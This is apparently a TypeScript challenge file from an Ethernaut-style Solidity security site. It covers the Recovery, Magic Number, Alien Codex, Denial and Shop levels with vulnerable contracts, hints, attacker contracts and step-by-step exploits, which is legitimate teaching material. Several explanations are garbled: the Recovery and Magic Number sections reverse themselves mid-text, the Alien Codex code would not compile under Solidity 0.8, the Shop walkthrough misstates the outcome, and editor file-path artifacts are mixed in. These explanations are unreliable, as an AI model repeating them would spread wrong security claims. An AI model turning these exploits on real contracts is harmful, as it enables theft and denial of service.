2.  **Prepare Data**: Choose any non-zero \`bytes32\` value for \`_name\`. This value will be written to slot \`type(uint256).max\`, which is harmless. The crucial part is the \`_mappedAddress\` argument passed to register.
3.  **Call Register**: Call the \`register\` function with:
    *   \`_name\`: Any non-zero \`bytes32\` value (e.g., \`0x01\`).
    *   \`_mappedAddress\`: The carefully calculated \`targetAddr\`.
4.  **Mechanism**:
    *   The contract calculates the storage slot for the struct: \`slot_N = keccak256(abi.encodePacked(targetAddr, uint256(2))) = type(uint256).max\`.
    *   The \`require\` check reads \`name\` from \`slot_N\`. Assuming this slot hasn't been written to, it's 0, so the check passes.
    *   The contract writes the struct:
        *   \`_name\` (e.g., \`0x01\`) goes into \`slot_N\` (\`type(uint256).max\`).
        *   \`_mappedAddress\` (\`targetAddr\`) goes into \`slot_N + 1\`. Since \`slot_N\` is \`type(uint256).max\`, adding 1 wraps around due to overflow, making \`slot_N + 1 = 0\`.
    *   Writing \`targetAddr\` (a non-zero address) to slot 0 overwrites the \`unlocked\` boolean, setting it to \`true\` (as any non-zero value is true for bool).
5.  **Verify**: Check \`locked.unlocked()\`. It should now return \`true\`.

### Key Takeaway
Solidity's storage layout rules, especially for data structures larger than 32 bytes (like structs or static arrays) within mappings, can lead to vulnerabilities if not fully understood. Writing such structures can cause overflows into adjacent storage slots, potentially overwriting critical state variables if a user can control the mapping key and the data being written leads to a targeted slot collision. Always be mindful of data size and potential slot overflows when dealing with complex storage operations.
`,
  },
  {
    slug: 'recovery',
    name: 'Recovery',
    icon: HeartHandshake,
    difficulty: 'Medium',
    description: 'Recover Ether sent to a contract created using `CREATE` without a `receive` or `payable fallback` function.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface SimpleToken {
  function destroy(address payable _to) external;
}

contract Recovery {

  SimpleToken token; // Slot 0

  constructor() {
    token = new SimpleToken(); // Deploys SimpleToken using CREATE
    // Send 0.001 Ether to the deployed SimpleToken contract
    token.destroy{value: 0.001 ether}(payable(address(this)));
  }

  // Function to destroy the SimpleToken and recover funds
  function destroyToken() public {
    token.destroy(payable(msg.sender));
  }

  // Note: Neither Recovery nor SimpleToken (in its hypothetical implementation)
  // necessarily has receive() or fallback() payable functions.
  // The SimpleToken interface only declares destroy.
}
`,
    hints: [
      'Ether was sent to a contract created via `CREATE`.',
      'Contracts created using `CREATE` have predictable addresses based on the creator\'s address and nonce.',
      'Formula: `new_address = keccak256(rlp([creator_address, nonce]))`',
      'Can you predict the address where `SimpleToken` was deployed?',
      'Even if a contract has no `receive` or `payable fallback`, Ether can be forcefully sent using `selfdestruct`.',
      'If you `selfdestruct` a contract at the *same address* as the original `SimpleToken`, where will the Ether go?',
    ],
    explanation: `### Vulnerability
Ether (0.001 ETH) was sent from the \`Recovery\` contract to the \`SimpleToken\` contract during the \`Recovery\` contract's deployment. This was done via the \`destroy\` function call with a \`value\` attached: \`token.destroy{value: 0.001 ether}(payable(address(this)));\`. Although the name is \`destroy\`, this line likely *doesn't* destroy the token contract immediately but rather just sends Ether to it. The \`SimpleToken\` contract itself (whose code isn't shown but is deployed via \`new SimpleToken()\`) presumably doesn't have a \`receive()\` or \`payable fallback()\` function, meaning Ether cannot be easily sent *out* of it through standard transfers or calls.

The key is that contracts deployed using the \`CREATE\` opcode (which is what \`new SimpleToken()\` uses) have deterministic addresses. The address of a contract created by another contract depends *only* on the creator contract's address and its current nonce (transaction count).

The address of the first contract created by another contract (nonce = 1) can be calculated using the formula:
\`new_address = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator_address, bytes1(0x01))))))\`
(The RLP encoding parts \`0xd6, 0x94\` and the nonce \`0x01\` are standard for the first contract created).

The vulnerability is that even though the original \`SimpleToken\` contract instance might be "stuck" with the Ether, its address is predictable. An attacker can:
1.  Calculate the address where the original \`SimpleToken\` was deployed by the \`Recovery\` contract.
2.  Deploy *another* contract that has a \`selfdestruct(payable recipient)\` function.
3.  Crucially, execute the \`selfdestruct\` function *from the calculated address*. This isn't possible directly, but you can *recreate* a contract at that address if the original contract at that address has already been destroyed *or if the address calculation leads to a pre-existing contract you control*.

Wait, the simpler approach: The \`Recovery\` contract *itself* has a \`destroyToken()\` function which calls \`token.destroy(payable(msg.sender))\`. If the *actual* implementation of \`SimpleToken\`'s \`destroy\` function includes a \`selfdestruct(recipient)\`, then calling \`Recovery.destroyToken()\` would destroy the \`SimpleToken\` contract and send its balance (the 0.001 ETH) to the \`msg.sender\` of the \`destroyToken\` call.

Let's reconsider the address prediction route. If the \`SimpleToken\` *doesn't* have a useful \`destroy\` function for recovery, how can we get the Ether?
If we can predict the address (\`tokenAddr\`) where \`SimpleToken\` was deployed, we can potentially interact with it *if we can somehow deploy our own contract at that same address*. This is usually only possible if the original contract at \`tokenAddr\` is destroyed first, freeing up the address. However, the standard Ethernaut solution involves using the fact that addresses derived from nonces *can* be calculated.

The core Ethernaut technique for this level is often:
1.  Calculate the address (\`tokenAddr\`) where \`SimpleToken\` was deployed using the \`Recovery\` contract's address and nonce 1.
2.  Realize that \`SimpleToken\` likely *does* implement \`destroy\` with a \`selfdestruct\`.
3.  Call \`Recovery.destroyToken()\`. This calls \`token.destroy(payable(msg.sender))\`.
4.  The \`selfdestruct\` within \`SimpleToken.destroy\` sends the contract's balance (0.001 ETH) to \`msg.sender\`, which is *your* address.

The address calculation aspect is more relevant if the original contract *couldn't* be destroyed easily, forcing you to recreate a contract at its address using \`selfdestruct\` from a carefully deployed contract.

### Exploit Steps (Standard Approach)
1.  **Identify Contracts**: You have the \`Recovery\` contract address. The \`SimpleToken\` address (\`tokenAddr\`) is stored within \`Recovery\` but you don't strictly need to calculate it if you assume \`destroyToken\` works as intended.
2.  **Call destroyToken**: Simply call the \`destroyToken()\` function on the deployed \`Recovery\` contract instance.
    *   \`recoveryInstance.destroyToken();\`
3.  **Mechanism**:
    *   Your call executes \`token.destroy(payable(msg.sender))\`.
    *   The \`SimpleToken\` contract at address \`tokenAddr\` receives the call.
    *   Its \`destroy\` function executes \`selfdestruct(payable(msg.sender))\`. Note: \`msg.sender\` inside \`SimpleToken.destroy\` is the \`Recovery\` contract, *not* your EOA. This detail is often missed. The Ether goes to the Recovery contract first.

Okay, the standard approach description above is slightly flawed. The Ether goes to the *Recovery contract* when \`SimpleToken\` self-destructs because \`msg.sender\` inside \`destroy\` is \`Recovery\`. This doesn't help the user directly.

Let's re-evaluate the address prediction path, as it's the intended solution:

### Exploit Steps (Intended Address Prediction Approach)
1.  **Get Creator Address**: Find the address of the deployed \`Recovery\` contract instance (\`recoveryAddr\`).
2.  **Calculate Token Address**: Calculate the address where the \`SimpleToken\` contract was deployed using \`recoveryAddr\` and nonce 1. Use the formula involving RLP encoding and keccak256, or use a library function (like ethers.js \`getContractAddress\`). Let this be \`tokenAddr\`.
    *   \`ethers.utils.getContractAddress({ from: recoveryAddr, nonce: 1 });\`
3.  **Verify Ether**: Check the balance of \`tokenAddr\`. It should be 0.001 ETH.
4.  **Interact with Token Address**: Since you know the address \`tokenAddr\`, you can treat it as if it were an instance of the \`SimpleToken\` interface. Create an interface instance pointing to \`tokenAddr\`.
    *   \`simpleTokenInstance = new ethers.Contract(tokenAddr, SimpleTokenInterfaceABI, signer);\`
5.  **Call Destroy Directly**: Call the \`destroy\` function directly on the \`simpleTokenInstance\`, passing your EOA address as the recipient.
    *   \`simpleTokenInstance.destroy(yourAddressPayable);\`
6.  **Mechanism**:
    *   You directly interact with the \`SimpleToken\` contract at \`tokenAddr\`.
    *   Its \`destroy\` function executes \`selfdestruct(recipient)\`, where \`recipient\` is your address.
    *   The 0.001 ETH balance of \`SimpleToken\` is transferred to your address.

### Key Takeaway
Contract addresses created using \`CREATE\` are deterministic and can be pre-calculated if the creator's address and nonce are known. Ether sent to contracts without payable recovery mechanisms can sometimes be retrieved by calculating the contract's address and directly calling a function like \`selfdestruct\` if one exists, or potentially by recreating a contract at that address after the original is destroyed.
`,
  },
  
  {
    slug: 'magic-number',
    name: 'Magic Number',
    icon: Wand2,
    difficulty: 'Medium',
    description: 'Provide a contract that returns the magic number 42 from its `whatIsTheMeaningOfLife()` function using minimal runtime bytecode.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISolver {
  function whatIsTheMeaningOfLife() external view returns (uint256);
}

contract MagicNum { // Ethernaut main contract
  address public solver; // Address of the user's solver contract

  constructor() {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  // The user needs to provide a contract address for 'solver'
  // such that calling whatIsTheMeaningOfLife() on it returns 42.
  // Minimal bytecode is the challenge.
}
`,
    hints: [
      'The goal is to create a contract whose runtime bytecode, when executed, returns the number 42.',
      'Consider EVM opcodes directly.',
      'Which opcodes push values onto the stack?',
      'Which opcodes return data from contract execution?',
      'How can you place the return value (42) in memory and return it?',
      'Opcodes: `PUSH1`, `MSTORE`, `RETURN`.',
      'The runtime bytecode is different from the deployment bytecode.',
    ],
    explanation: `### Vulnerability / Challenge
This level isn't about exploiting a vulnerability but about understanding the Ethereum Virtual Machine (EVM) at a low level. You need to create a contract (\`Solver\`) whose runtime bytecode is extremely small and specifically designed to return the number 42 when called.

The \`MagicNum\` contract simply takes the address of your \`Solver\` contract and will presumably call \`whatIsTheMeaningOfLife()\` on it (though the call itself isn't shown in the provided code, it's implied by the \`ISolver\` interface).

The challenge is to minimize the *runtime* bytecode of the \`Solver\`. Runtime bytecode is the code actually stored on the blockchain at the contract's address after deployment. It excludes the deployment/constructor logic.

### EVM Opcodes for Returning 42
To return a value from an EVM execution context, you need to:
1.  Place the value in memory.
2.  Use the \`RETURN\` opcode, specifying the memory offset and length of the data to return.

The number 42 (decimal) is 0x2a (hexadecimal). We want to return this value as a \`uint256\`. A \`uint256\` is 32 bytes long. We need to return 32 bytes from memory, where the last byte is 0x2a and the preceding 31 bytes are 0x00.

A minimal sequence of opcodes could be:
1.  \`PUSH1 0x2a\`: Push the value 42 onto the stack. Stack: \`[0x2a]\`
2.  \`PUSH1 0x00\`: Push the memory offset 0 onto the stack. Stack: \`[0x00, 0x2a]\`
3.  \`MSTORE\`: Store the value at the top of the stack (\`0x2a\`) into memory at the offset specified by the second item on the stack (\`0x00\`). Memory at address 0x00 now holds \`0x00...002a\` (32 bytes). Stack: \`[]\`
4.  \`PUSH1 0x20\`: Push the length of the data to return (32 bytes = 0x20) onto the stack. Stack: \`[0x20]\`
5.  \`PUSH1 0x00\`: Push the memory offset to return from (0x00) onto the stack. Stack: \`[0x00, 0x20]\`
6.  \`RETURN\`: Return 32 bytes (\`0x20\`) from memory starting at offset 0 (\`0x00\`). Stack: \`[]\`

### Bytecode Representation
Let's translate these opcodes into hexadecimal bytecode:
*   \`PUSH1 0x2a\`: Opcode for \`PUSH1\` is \`0x60\`. The value is \`0x2a\`. Bytecode: \`602a\`
*   \`PUSH1 0x00\`: Opcode \`0x60\`. Value \`0x00\`. Bytecode: \`6000\`
*   \`MSTORE\`: Opcode is \`0x52\`. Bytecode: \`52\`
*   \`PUSH1 0x20\`: Opcode \`0x60\`. Value \`0x20\`. Bytecode: \`6020\`
*   \`PUSH1 0x00\`: Opcode \`0x60\`. Value \`0x00\`. Bytecode: \`6000\`
*   \`RETURN\`: Opcode is \`0xf3\`. Bytecode: \`f3\`

Concatenated Runtime Bytecode: \`602a60005260206000f3\` (10 bytes)

### Deployment
You cannot deploy this runtime bytecode directly using Solidity. You need a way to deploy raw bytecode. This typically involves:
1.  **Deployment Bytecode**: Creating *deployment* bytecode that, when executed by the EVM during contract creation, *returns* the desired *runtime* bytecode.
2.  **Deployer Tool/Contract**: Using a tool (like \`cast\`, Remix with raw bytecode, or a custom script) or a deployer contract to send a transaction with the deployment bytecode.

A common way to construct the deployment bytecode is to use opcodes to copy the runtime bytecode into memory and then return it using \`CODECOPY\` and \`RETURN\`.

Example Deployment Opcodes (to return the 10 bytes of runtime code):
1.  \`PUSH10 602a60005260206000f3\`: Push the 10 bytes of runtime code onto the stack. (Opcode \`0x69\`)
2.  \`PUSH1 0x00\`: Push memory offset 0. (Opcode \`0x60\`)
3.  \`MSTORE\`: Store the first 32 bytes (padded) containing runtime code at memory offset 0.
4.  \`PUSH1 0x0a\`: Push the length of the runtime code (10 bytes = 0x0a). (Opcode \`0x60\`)
5.  \`PUSH1 0x16\`: Push the memory offset where runtime code *starts* within the padded 32 bytes pushed earlier (32 - 10 = 22 = 0x16). (Opcode \`0x60\`)
    *   *Correction*: Simpler: Push memory offset 0 (where we stored it). \`PUSH1 0x00\`
6.  \`RETURN\`: Return 10 bytes from memory offset 0. (Opcode \`0xf3\`)

Deployment Bytecode (approximate, needs careful construction of PUSH10):
\`69602a60005260206000f3\` (runtime code) + \`600052\` (MSTORE) + \`600a\` (length) + \`6000\` (offset) + \`f3\` (RETURN)
Wait, the deployment opcodes need to *copy* the runtime code first.

Deployment using \`CODECOPY\`:
1.  \`PUSH1 0x0a\` (runtime code length 10)
2.  \`PUSH1 ??\` (offset in deployment code where runtime code starts)
3.  \`PUSH1 0x00\` (memory destination offset 0)
4.  \`CODECOPY\` (copy runtime code from deployment code to memory)
5.  \`PUSH1 0x0a\` (runtime code length 10)
6.  \`PUSH1 0x00\` (memory offset 0)
7.  \`RETURN\` (return the runtime code from memory)

This is getting complex. The simplest way using modern tools is often:

### Exploit Steps (Using Foundry/Cast)
1.  **Create Runtime Bytecode String**: \`runtime_bytecode="602a60005260206000f3"\`
2.  **Deploy using Cast**: Use \`cast publish --code $runtime_bytecode\` or \`forge create --code $runtime_bytecode ContractName\`. Foundry handles wrapping this runtime code with the necessary deployment code.
    *   Example: \`cast publish --code 602a60005260206000f3 --private-key $YOUR_PK\`
3.  **Get Solver Address**: Note the address where the contract was deployed (\`solverAddr\`).
4.  **Set Solver**: Call \`magicNumInstance.setSolver(solverAddr)\`.
5.  **Submit**: Submit the Ethernaut instance. Ethernaut will call \`solver.whatIsTheMeaningOfLife()\` which will execute the runtime bytecode \`602a60005260206000f3\` and return 42.

### Key Takeaway
Smart contracts are ultimately EVM bytecode. Understanding basic opcodes like \`PUSH\`, \`MSTORE\`, and \`RETURN\` allows creating highly optimized, low-level contracts that perform specific actions, like returning a constant value, without the overhead of the Solidity compiler's boilerplate code.
`,
  },
  {
    slug: 'alien-codex',
    name: 'Alien Codex',
    icon: FileCode,
    difficulty: 'Hard',
    description: 'Claim ownership of the Alien Codex contract by exploiting array length manipulation and storage slot collisions.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// From OpenZeppelin Contracts v4.x
import "@openzeppelin/contracts/access/Ownable.sol";

contract AlienCodex is Ownable {

  bool public contact; // slot 1
  bytes32[] public codex; // slot 2 - Dynamic array

  modifier contacted() {
    require(contact, "Make contact first");
    _;
  }

  function make_contact() public {
    contact = true;
  }

  // Underflow vulnerability if codex.length is 0
  function retract() contacted public {
    // codex.length is uint256
    // If length is 0, 0 - 1 underflows to type(uint256).max
    codex.length--;
  }

  // Allows writing to arbitrary indices if bounds check is bypassed
  function revise(uint i, bytes32 _content) contacted public {
    // Array access checks i < codex.length
    codex[i] = _content;
  }
}
`,
    hints: [
      'The contract inherits `Ownable`, placing `owner` in slot 0.',
      'The `codex` is a dynamic array. Where is its length stored?',
      'Where is the data for a dynamic array stored?',
      'The `retract` function can cause an underflow in `codex.length`. What is the value of `uint256(0) - 1`?',
      'If `codex.length` becomes extremely large due to underflow, what happens to the bounds check `i < codex.length` in `revise`?',
      'Can you use `revise` to write to arbitrary storage slots?',
      'How do you calculate the storage slot for an array element `codex[i]`?',
      'Formula: `slot = keccak256(abi.encode(array_slot)) + i`',
      'Which storage slot holds the `owner` variable?',
      'Can you calculate the index `i` such that the storage slot for `codex[i]` coincides with slot 0?',
    ],
    explanation: `### Vulnerability
This contract has multiple vulnerabilities that chain together:
1.  **Ownership Storage Slot**: Inheriting from OpenZeppelin's \`Ownable\` places the \`owner\` variable in storage slot 0.
2.  **Array Length Underflow**: The \`retract\` function decrements \`codex.length\`. If the array is empty (\`length == 0\`), subtracting 1 from the \`uint256\` length causes it to underflow to \`type(uint256).max\` (a huge number).
3.  **Array Bounds Check Bypass**: The \`revise(uint i, bytes32 _content)\` function writes to \`codex[i]\`. Solidity normally performs a bounds check (\`i < codex.length\`). However, if \`codex.length\` has underflowed to \`type(uint256).max\`, this check becomes effectively useless, as almost any \`i\` will be less than \`type(uint256).max\`. This allows writing to arbitrary array indices, even far beyond the actual allocated data.
4.  **Storage Collision**: Writing to an array element \`codex[i]\` modifies a specific storage slot. The slot for element \`i\` of a dynamic array stored at base slot \`p\` (here, \`p=2\` for \`codex\`) is calculated as \`keccak256(abi.encode(p)) + i\`. By choosing the right index \`i\`, an attacker can make this calculated slot collide with any other storage slot in the contract, including slot 0 where the \`owner\` is stored.

The goal is to overwrite storage slot 0 with the attacker's address.

### Exploit Steps
1.  **Make Contact**: Call \`alienCodexInstance.make_contact()\` to set \`contact = true\` and bypass the \`contacted\` modifier requirement.
2.  **Trigger Underflow**: Call \`alienCodexInstance.retract()\`. Since \`codex\` is initially empty (\`length = 0\`), this underflows \`codex.length\` to \`type(uint256).max\`. Check \`codex.length()\` afterwards; it should report a massive number.
3.  **Calculate Target Index \`i\`**: We want to find the index \`i\` such that the storage slot for \`codex[i]\` is slot 0 (the \`owner\` slot).
    *   The storage slot for \`codex\` itself is slot 2 (after \`owner\` in slot 0 and \`contact\` in slot 1).
    *   The storage slot for \`codex[i]\` is \`keccak256(abi.encode(uint256(2))) + i\`.
    *   We want this slot to be 0: \`keccak256(abi.encode(uint256(2))) + i = 0\`.
    *   Solve for \`i\`: \`i = 0 - keccak256(abi.encode(uint256(2)))\`.
    *   Since \`i\` must be a \`uint256\`, this subtraction is done using modulo arithmetic (2^256).
    *   \`i = type(uint256).max - keccak256(abi.encode(uint256(2))) + 1\`.
    *   Calculate \`keccak256(abi.encode(uint256(2)))\`. Let this hash be \`codexDataSlotHash\`.
    *   The target index is \`i_owner = type(uint256).max - codexDataSlotHash + 1\`.
4.  **Prepare Payload**: We want to write our address to slot 0. Addresses are 20 bytes, but storage slots are 32 bytes. We need to pad our address to 32 bytes. The \`revise\` function takes a \`bytes32\` argument.
    *   Convert your attacker address (\`attackerAddr\`) to a \`uint256\`.
    *   Cast this \`uint256\` to \`bytes32\`. This effectively left-pads the address with zeros. \`payload = bytes32(uint256(uint160(attackerAddr)))\`.
5.  **Overwrite Owner**: Call \`alienCodexInstance.revise(i_owner, payload)\`.
    *   The bounds check \`i_owner < codex.length\` passes because \`codex.length\` is \`type(uint256).max\`.
    *   The contract calculates the storage slot for \`codex[i_owner]\` which, due to our calculation of \`i_owner\`, resolves to slot 0.
    *   The \`payload\` (your address padded to 32 bytes) is written into storage slot 0, overwriting the original \`owner\`.
6.  **Verify**: Check \`alienCodexInstance.owner()\`. It should now return your attacker address.

### Key Takeaway
Dynamic arrays in Solidity require careful handling. Integer underflows/overflows, especially on array lengths, can break critical invariants like bounds checking. When combined with predictable storage slot calculations for array elements, this can allow attackers to write to arbitrary storage locations, leading to devastating exploits like owner overwrites. Always use safe math libraries (like OpenZeppelin's SafeMath for older Solidity versions, or rely on checked arithmetic in Solidity >=0.8.0) for operations that could underflow or overflow, especially on values controlling array access or resource allocation.
`,
  },
  {
    slug: 'denial',
    name: 'Denial',
    icon: Ban,
    difficulty: 'Hard',
    description: 'Prevent the owner from withdrawing funds by causing the withdrawal function to run out of gas.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Denial is Ownable {

    address public partner; // withdrawal partner - could be hostile!
    uint public constant timeLock = 1 days;
    uint public withdrawTime;

    mapping (address => uint) public withdrawRequests;

    // Sets the withdrawal partner
    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // Request withdrawal
    function requestWithdraw() public {
        withdrawRequests[msg.sender] = block.timestamp;
    }

    // Withdraw funds - vulnerable to gas exhaustion
    function withdraw() public {
        require(withdrawRequests[owner] > 0, "Owner has not requested");
        require(block.timestamp >= withdrawRequests[owner] + timeLock, "Lock time not passed");

        uint amount = address(this).balance;

        // External call to potentially hostile partner contract
        // If partner's receive() or fallback() consumes too much gas or reverts,
        // the withdrawal fails.
        (bool sent, ) = partner.call{value: amount}(""); // Low level call
        require(sent, "Withdrawal failed");

        // Reset request time - may not be reached if call fails
        withdrawRequests[owner] = 0;
    }

    // Allow owner to deposit funds
    function deposit() public payable onlyOwner {}

    // Fallback function to accept ether
    receive() external payable {}
}
`,
    hints: [
      'The [withdraw](cci:1://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:1:4-3:5) function sends the entire contract balance to a `partner` address using a low-level `.call{value: amount}("")`.',
      'The `partner` address can be set by anyone via `setWithdrawPartner`.',
      'What happens if the `partner` is a contract?',
      'What happens during an Ether transfer via `.call` if the recipient is a contract?',
      'The recipient contract\'s `receive()` or `fallback()` function is executed.',
      'What if the `partner` contract\'s `receive()` or `fallback()` function consumes a lot of gas or always reverts?',
      'Can you create a contract that acts as a gas sink or always reverts upon receiving Ether?',
      'Set this malicious contract as the `partner`.',
    ],
    explanation: `### Vulnerability
The contract allows anyone to set a \`partner\` address. The \`withdraw\` function, intended for the owner to retrieve funds, sends the *entire* contract balance to this \`partner\` address using a low-level call: \[(bool sent, ) = partner.call{value: amount}("");\](cci:1://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:1:4-3:5).

If the \`partner\` address points to a smart contract, this low-level call will trigger the execution of the partner contract's \`receive()\` function (if it exists and the call has no data) or its \`fallback()\` function (if \`receive()\` doesn't exist or the call has data, though here it's empty).

The vulnerability is a Denial of Service (DoS) attack vector:
An attacker can deploy a malicious contract and set it as the \`partner\`. This malicious contract's \`receive()\` or \`fallback()\` function can be designed to:
1.  **Consume Excessive Gas**: Perform operations that intentionally use up almost all the gas forwarded with the \`.call\`. If the gas runs out *inside* the partner's fallback, the \`.call\` fails, \`sent\` becomes false, the \`require(sent, ...)\` reverts, and the owner cannot withdraw funds.
2.  **Always Revert**: Simply include a \`revert()\` statement in the \`receive()\` or \`fallback()\` function. This causes the external call to fail, again making \`sent\` false and preventing withdrawal.

Since anyone can call \`setWithdrawPartner\`, an attacker can set their malicious contract as the partner, effectively blocking the owner from ever withdrawing the funds via the \`withdraw\` function.

### Exploit Steps
1.  **Create Malicious Partner Contract**: Deploy a simple contract (e.g., \`DenialAttacker\`) with a \`receive()\` or \`fallback()\` function designed to fail or consume gas.
    *   **Option A: Reverting Fallback**
        \`\`\`solidity
        // SPDX-License-Identifier: MIT
        pragma solidity ^0.8.0;

        contract DenialAttacker {
            // This function will be called when Denial sends Ether via .call
            fallback() external payable {
                // Always revert to cause the .call in Denial to fail
                revert("Haha, no withdrawal for you!");
            }

            // Optional receive() could do the same
            // receive() external payable {
            //     revert("Haha, no withdrawal for you!");
            // }
        }
        \`\`\`
    *   **Option B: Gas Sink Fallback (Less common for this level)**
        \`\`\`solidity
        // SPDX-License-Identifier: MIT
        pragma solidity ^0.8.0;

        contract DenialAttacker {
            fallback() external payable {
                // Consume gas, e.g., infinite loop (dangerous!) or complex storage writes
                // A simple revert is usually sufficient for the Ethernaut level.
                // Example (DO NOT USE UNCHECKED LOOPS IN REAL CONTRACTS):
                // uint i = 0;
                // while(true) { i++; }
                revert(); // Still revert to be safe
            }
        }
        \`\`\`
2.  **Deploy Attacker Contract**: Deploy your chosen \`DenialAttacker\` contract and get its address (\`attackerContractAddr\`).
3.  **Set Malicious Partner**: Call the \`setWithdrawPartner\` function on the \`Denial\` instance, passing the \`attackerContractAddr\`.
    *  \`denialInstance.setWithdrawPartner(attackerContractAddr);\`
4.  **Attempt Withdrawal (Owner Action)**: If the owner now tries to call \`withdraw\` (after meeting the time lock requirements):
    *   The \`Denial\` contract executes \`partner.call{value: amount}("")\`.
    *   This calls the \`fallback\` function of your \`DenialAttacker\` contract.
    *   Your attacker contract's fallback reverts (or runs out of gas).
    *   The \[(sent, )\](cci:1://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:1:4-3:5) returned by \`.call\` becomes \[(false, )](cci:1://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:1:4-3:5).
    *   The \`require(sent, "Withdrawal failed");\` line in \`Denial\` causes the entire \`withdraw\` transaction to revert.
5.  **Result**: The owner is permanently denied access to the funds via the \`withdraw\` function as long as the malicious contract is set as the partner.

### Key Takeaway
External calls in Solidity, especially those involving Ether transfer to potentially untrusted addresses, are major points of risk. Using low-level \`.call\` can lead to reentrancy if not handled carefully (though not the issue here). More relevantly here, if the recipient can cause the call to fail (by reverting or consuming too much gas), it can create Denial of Service vulnerabilities, preventing the calling contract from completing its intended operation. Avoid designs where essential functions rely on the successful execution of external calls to addresses that can be influenced by untrusted users. Consider patterns like pull payments instead of push payments where feasible.
`,
  },
  
  {
    slug: 'shop',
    name: 'Shop',
    icon: ShoppingCart,
    difficulty: 'Hard',
    description: 'Buy the item from the shop for less than the asking price.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop { // Note: Interface name typo fixed vs some Ethernaut versions
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer buyer = Buyer(msg.sender); // Assumes caller is a contract implementing Buyer

        // Checks price offered by buyer *before* changing state
        if (buyer.price() >= price && !isSold) {
            isSold = true; // State changes *after* external call
            price = buyer.price(); // Actual price update happens too late for the check
        }
    }
}

/* Example Buyer (Attacker) Contract:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interfaces needed by the attacker contract
interface IShop {
    function isSold() external view returns (bool);
    function price() external view returns (uint);
    function buy() external;
}

interface Buyer {
    function price() external view returns (uint);
}

// Attacker contract implementing the Buyer interface
contract AttackBuyer is Buyer {
    IShop public shopInstance;
    // Prices designed to pass/fail the check based on shop state
    uint constant HIGH_PRICE = 101; // Price to offer when shop is NOT sold
    uint constant LOW_PRICE = 1;    // Price to offer when shop IS sold

    constructor(address _shopAddress) {
        shopInstance = IShop(_shopAddress);
    }

    // This function is called BY the Shop contract during its buy() execution
    function price() external view override returns (uint) {
        // Check the shop's state *during* the external call
        if (shopInstance.isSold()) {
            // If shop.isSold is true (which it isn't yet during the check),
            // we *would* offer a low price.
            // This branch isn't hit during the initial check.
            return LOW_PRICE;
        } else {
            // Shop.isSold is false during the check, so offer a high price
            // to satisfy the condition buyer.price() >= shop.price
            return HIGH_PRICE;
        }
    }

    // Function called by the attacker (EOA) to initiate the exploit
    function attack() public {
        shopInstance.buy();
    }
}

*/
`,
    hints: [
      'The `Shop` contract calls back to the `msg.sender` (assumed to be a contract implementing `Buyer`) to get the price using `buyer.price()`.',
      'The `buy` function checks `buyer.price() >= price` *before* setting `isSold = true`.',
      'The `Buyer` contract\'s `price()` function can read the state of the `Shop` contract (like `shop.isSold()`).',
      'Can you design a `Buyer` contract whose `price()` function returns a different value depending on whether `shop.isSold()` is true or false?',
      'Trace the execution flow: `AttackBuyer.attack()` calls `Shop.buy()`, which calls `AttackBuyer.price()`. What value does `price()` return based on `shop.isSold()` *at that moment*?',
      'After `AttackBuyer.price()` returns, `Shop.buy()` continues. What state changes occur in `Shop`?',
    ],
    explanation: `### Vulnerability
The vulnerability lies in a state inconsistency exploited via an external call. The \`Shop.buy()\` function checks the price offered by the buyer contract *before* it updates its own internal state (\`isSold\`). The buyer contract, however, can read the shop's state *during* the external call.

T he \`Shop.buy()\` function performs these steps in order:
1.  Casts \`msg.sender\` to the \`Buyer\` interface.
2.  Calls \`buyer.price()\` to get the price offered by the buyer contract. Let this returned value be \`offeredPrice\`.
3.  Checks the condition: \`if (offeredPrice >= price && !isSold)\`. Initially, \`price\` is 100 and \`isSold\` is false.
4.  If the check passes (which means the buyer offered >= 100):
    a.  Sets \`isSold = true\`.
    b.  Sets \`price = offeredPrice\`.

The attack requires creating a malicious \`Buyer\` contract (\`AttackBuyer\`) whose \`price()\` function behaves conditionally based on the shop's state *at the moment it is called*:

*   **\`AttackBuyer.price()\` logic:**
    *   Read \`Shop.isSold()\`.
    *   If \`Shop.isSold()\` is \`false\`, return a price >= 100 (e.g., 101).
    *   If \`Shop.isSold()\` is \`true\`, return a price < 100 (e.g., 1).

### Exploit Steps
1.  **Create & Deploy Attacker Contract**: Write and deploy the \`AttackBuyer\` contract (like the example provided in the vulnerable code comments), passing the target \`Shop\` instance address to its constructor. Note the deployed \`AttackBuyer\` address.
2.  **Initiate Attack**: Call the \`attack()\` function on your deployed \`AttackBuyer\` instance from your EOA.
3.  **Execution Flow**:
    a.  \`AttackBuyer.attack()\` calls \`Shop.buy()\`. Inside \`Shop.buy\`, \`msg.sender\` is the \`AttackBuyer\` address.
    b.  \`Shop.buy()\` calls \`buyer.price()\` (where \`buyer\` refers to the \`AttackBuyer\` instance).
    c.  Control transfers to \`AttackBuyer.price()\`.
    d.  Inside \`AttackBuyer.price()\`, it reads \`shopInstance.isSold()\`. At this specific moment, \`isSold\` in the \`Shop\` contract is still \`false\`.
    e.  Therefore, \`AttackBuyer.price()\` returns the \`HIGH_PRICE\` (e.g., 101).
    f.  Control returns to \`Shop.buy()\`. The \`offeredPrice\` received is 101.
    g.  The check \`if (offeredPrice >= price && !isSold)\` evaluates as \`if (101 >= 100 && !false)\`, which is **true**.
    h.  The \`if\` block executes:
        i.  \`isSold\` in the \`Shop\` contract is set to \`true\`.
        ii. \`price\` in the \`Shop\` contract is set to \`offeredPrice\` (101).
    i.  The \`Shop.buy()\` function finishes.
